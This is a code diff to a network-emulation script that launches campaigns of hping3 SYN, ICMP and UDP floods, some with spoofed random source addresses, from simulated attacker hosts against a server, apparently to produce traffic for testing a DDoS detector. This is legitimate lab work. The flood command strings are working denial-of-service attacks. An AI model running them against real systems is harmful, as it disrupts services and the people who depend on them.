@@ -32,39 +32,35 @@ _ATTACKER_NUMS = {6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19,
                   22, 23, 24, 25, 26, 27}
 _LEGIT_NUMS    = {1, 2, 3, 4, 5}
 
-# 10 SYN, 7 ICMP, 2 UDP, 1 MIXED (h6-h19, h22-h27)
+# 7 SYN, 7 ICMP, 6 UDP (h6-h19, h22-h27)
 _ATTACKER_VARIANTS = {
     #        type     flags                              burst   sleep
     # burst/sleep unused — all attackers run pure continuous --flood (no -c, no sleep)
-    6:  ("SYN",  "-S -p 80   --flood",                  0, 0),
-    7:  ("SYN",  "-S -p 443  --flood",                  0, 0),
-    8:  ("SYN",  "-S -p 22   --flood",                  0, 0),
-    9:  ("SYN",  "-S -p 3306 --flood",                  0, 0),
+    6:  ("UDP",  "--udp -p 53    --flood --data 64",    0, 0),
+    7:  ("UDP",  "--udp -p 123   --flood --data 128",   0, 0),
+    8:  ("UDP",  "--udp -p 1900  --flood --data 256",   0, 0),
+    9:  ("UDP",  "--udp -p 11211 --flood --data 800",   0, 0),
     10: ("SYN",  "-S -p 8080 --flood",                  0, 0),
-    11: ("ICMP", "--icmp --flood --data 1400",           0, 0),
-    12: ("ICMP", "--icmp --flood --data 64",             0, 0),
-    13: ("ICMP", "--icmp --flood --data 256",            0, 0),
-    14: ("ICMP", "--icmp --flood --data 512",            0, 0),
+    11: ("ICMP", "--icmp --flood --data 1480",           0, 0),
+    12: ("ICMP", "--icmp --flood --data 800",            0, 0),
+    13: ("ICMP", "--icmp --flood --data 1024",           0, 0),
+    14: ("ICMP", "--icmp --flood --data 1200",           0, 0),
     15: ("ICMP", "--icmp --flood --data 128",            0, 0),
-    16: ("UDP",  "--udp -p 53    --flood --data 1400",   0, 0),
-    17: ("UDP",  "--udp -p 123   --flood --data 512",    0, 0),
+    16: ("UDP",  "--udp -p 53    --flood --data 1024",  0, 0),
+    17: ("UDP",  "--udp -p 123   --flood --data 1400",  0, 0),
     18: ("SYN",  "-S -p 1900   --flood",               0, 0),
-    # MIXED fires SYN and UDP together, model never trained on this combo
-    19: ("MIXED", "--udp -p 11211 --flood",              0, 0),
+    19: ("SYN",  "-S -p 1900   --flood",               0, 0),
     22: ("SYN",  "-S -p 21   --flood",                  0, 0),
     23: ("SYN",  "-S -p 25   --flood",                  0, 0),
     24: ("SYN",  "-S -p 3389 --flood",                  0, 0),
     25: ("SYN",  "-S -p 5432 --flood",                  0, 0),
-    26: ("ICMP", "--icmp --flood --data 1400",           0, 0),
-    27: ("ICMP", "--icmp --flood --data 1000",           0, 0),
+    26: ("ICMP", "--icmp --flood --data 64",             0, 0),
+    27: ("ICMP", "--icmp --flood --data 512",            0, 0),
 }
 
-# Stagger order: SYN, then ICMP, then UDP, then MIXED
+# Stagger delays: 0.5-2.0s random
 _ATTACKER_START_DELAYS = {
-    6: 0.0, 7: 0.05, 8: 0.1, 9: 0.15, 10: 0.2,
-    11: 0.25, 12: 0.3, 13: 0.35, 14: 0.4, 15: 0.45,
-    16: 0.5, 17: 0.55, 18: 0.6, 19: 0.65,
-    22: 0.7, 23: 0.75, 24: 0.8, 25: 0.85, 26: 0.9, 27: 0.95,
+    num: round(random.uniform(0.5, 2.0), 2) for num in _ATTACKER_NUMS
 }
 
 # attack_min, attack_max, rest_min, rest_max in seconds
@@ -648,13 +644,13 @@ def launch_udp_flood_sustained(attacker_name="h16") -> None:
 
 
 def start_syn_flood_campaign() -> None:
-    # SYN flood — h6, h7, h8 continuous, watchdog auto-restarts if killed
+    # SYN flood — h10, h18, h19 continuous, watchdog auto-restarts if killed
     global _mixed_stop_event, _campaign_threads
     _mixed_stop_event.clear()
     info("\n" + "=" * 55 + "\n")
-    info("  [SYN CAMPAIGN]  h6 h7 h8  |  Continuous flood\n")
+    info("  [SYN CAMPAIGN]  h10 h18 h19  |  Continuous flood\n")
     info("=" * 55 + "\n")
-    for num in [6, 7, 8]:
+    for num in [10, 18, 19]:
         h = net.get(f"h{num}")
         t = threading.Thread(
             target=_attacker_cycle_worker, args=(num, _mixed_stop_event),
@@ -694,13 +690,13 @@ def start_icmp_flood_campaign() -> None:
 
 
 def start_udp_flood_campaign() -> None:
-    # UDP flood — h16, h17, h18 continuous, watchdog auto-restarts if killed
+    # UDP flood — h6, h7, h8 continuous, watchdog auto-restarts if killed
     global _mixed_stop_event, _campaign_threads
     _mixed_stop_event.clear()
     info("\n" + "=" * 55 + "\n")
-    info("  [UDP CAMPAIGN]  h16 h17 h18  |  Continuous flood\n")
+    info("  [UDP CAMPAIGN]  h6 h7 h8  |  Continuous flood\n")
     info("=" * 55 + "\n")
-    for num in [16, 17, 18]:
+    for num in [6, 7, 8]:
         h = net.get(f"h{num}")
         t = threading.Thread(
             target=_attacker_cycle_worker, args=(num, _mixed_stop_event),
@@ -765,26 +761,26 @@ def start_stress_test() -> None:
 
     # Build rand-source flood commands per attack type
     _STRESS_CMDS = {
-        6:  "hping3 -S -p 80   --flood --rand-source {t} > /dev/null 2>&1",
-        7:  "hping3 -S -p 443  --flood --rand-source {t} > /dev/null 2>&1",
-        8:  "hping3 -S -p 22   --flood --rand-source {t} > /dev/null 2>&1",
-        9:  "hping3 -S -p 3306 --flood --rand-source {t} > /dev/null 2>&1",
+        6:  "hping3 --udp -p 53    --flood --rand-source --data 64 {t} > /dev/null 2>&1",
+        7:  "hping3 --udp -p 123   --flood --rand-source --data 128 {t} > /dev/null 2>&1",
+        8:  "hping3 --udp -p 1900  --flood --rand-source --data 256 {t} > /dev/null 2>&1",
+        9:  "hping3 --udp -p 11211 --flood --rand-source --data 800 {t} > /dev/null 2>&1",
         10: "hping3 -S -p 8080 --flood --rand-source {t} > /dev/null 2>&1",
-        11: "hping3 --icmp --flood --rand-source --data 64 {t} > /dev/null 2>&1",
-        12: "hping3 --icmp --flood --rand-source --data 32 {t} > /dev/null 2>&1",
-        13: "hping3 --icmp --flood --rand-source --data 32 {t} > /dev/null 2>&1",
-        14: "hping3 --icmp --flood --rand-source --data 32 {t} > /dev/null 2>&1",
-        15: "hping3 --icmp --flood --rand-source --data 32 {t} > /dev/null 2>&1",
-        16: "hping3 --udp -p 53    --flood --rand-source --data 32 {t} > /dev/null 2>&1",
-        17: "hping3 --udp -p 123   --flood --rand-source --data 32 {t} > /dev/null 2>&1",
+        11: "hping3 --icmp --flood --rand-source --data 1480 {t} > /dev/null 2>&1",
+        12: "hping3 --icmp --flood --rand-source --data 800 {t} > /dev/null 2>&1",
+        13: "hping3 --icmp --flood --rand-source --data 1024 {t} > /dev/null 2>&1",
+        14: "hping3 --icmp --flood --rand-source --data 1200 {t} > /dev/null 2>&1",
+        15: "hping3 --icmp --flood --rand-source --data 128 {t} > /dev/null 2>&1",
+        16: "hping3 --udp -p 53    --flood --rand-source --data 1024 {t} > /dev/null 2>&1",
+        17: "hping3 --udp -p 123   --flood --rand-source --data 1400 {t} > /dev/null 2>&1",
         18: "hping3 -S -p 1900   --flood --rand-source {t} > /dev/null 2>&1",
-        19: "hping3 --udp -p 11211 --flood --rand-source {t} > /dev/null 2>&1 & hping3 -S -p 1900 --flood --rand-source {t} > /dev/null 2>&1 & wait",
+        19: "hping3 -S -p 1900   --flood --rand-source {t} > /dev/null 2>&1",
         22: "hping3 -S -p 21   --flood --rand-source {t} > /dev/null 2>&1",
         23: "hping3 -S -p 25   --flood --rand-source {t} > /dev/null 2>&1",
         24: "hping3 -S -p 3389 --flood --rand-source {t} > /dev/null 2>&1",
         25: "hping3 -S -p 5432 --flood --rand-source {t} > /dev/null 2>&1",
         26: "hping3 --icmp --flood --rand-source --data 64 {t} > /dev/null 2>&1",
-        27: "hping3 --icmp --flood --rand-source --data 32 {t} > /dev/null 2>&1",
+        27: "hping3 --icmp --flood --rand-source --data 512 {t} > /dev/null 2>&1",
     }
 
     info("*** Starting stress test — all 20 attackers, rand-source flood -> {}\n".format(SERVER_IP))
